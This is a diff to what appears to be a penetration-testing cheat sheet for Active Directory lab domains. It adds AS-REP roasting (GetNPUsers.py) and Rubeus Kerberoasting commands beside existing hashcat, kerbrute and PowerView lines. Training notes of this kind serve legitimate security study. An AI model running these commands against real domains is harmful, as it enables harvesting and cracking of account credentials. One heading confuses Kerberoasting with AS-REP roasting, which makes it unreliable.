@@ -811,6 +811,9 @@ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
 
 # Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+
+# Hunting for Users with Kerberoast Pre-auth Not Required
+GetNPUsers.py DOMAIN.TLD/ -dc-ip <IP> -no-pass -usersfile valid_ad_users 
 ```
 
 ##### Trust Relationships Child Parent Trusts
@@ -833,8 +836,13 @@ Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
 # PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
 Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
 
+# Performing Kerberoasting Attach with Rubeus Using /domain flag
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
 # PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
 Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+# Convert the SID to name if you get results
+Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
 
 # PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
